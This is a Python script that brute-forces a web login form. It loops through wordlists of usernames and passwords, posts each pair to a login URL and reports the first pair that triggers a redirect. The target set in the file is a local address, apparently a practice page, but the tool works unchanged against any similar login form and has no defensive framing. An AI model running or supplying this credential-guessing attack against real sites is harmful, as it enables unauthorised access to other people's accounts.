import requests
from bs4 import BeautifulSoup

def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def try_login(url, username, password):
    session = requests.Session()
    login_data = {
        'username': username,
        'password': password
    }
    
    response = session.post(url, data=login_data)
    
    # Check for a successful login here
    # This might depend on your site, e.g., checking for a redirect, a specific message, etc.
    # Example for checking a successful login by HTTP status code:
    if response.url != url:  # Assuming a redirect means a successful login
        return True
    return False

def main(login_url, usernames_file, passwords_file):
    usernames = read_file(usernames_file)
    passwords = read_file(passwords_file)
    
    for username in usernames:
        for password in passwords:
            if try_login(login_url, username, password):
                print(f"Found valid credentials! Username: {username}, Password: {password}")
                return
    print("No valid credentials found.")

if __name__ == "__main__":
    login_url = "http://127.0.0.1:5500/const_var.html"  # Replace with your local login URL
    usernames_file = "posibles_usuarios_javascript.txt"
    passwords_file = "password_javascript_login.txt"
    main(login_url, usernames_file, passwords_file)
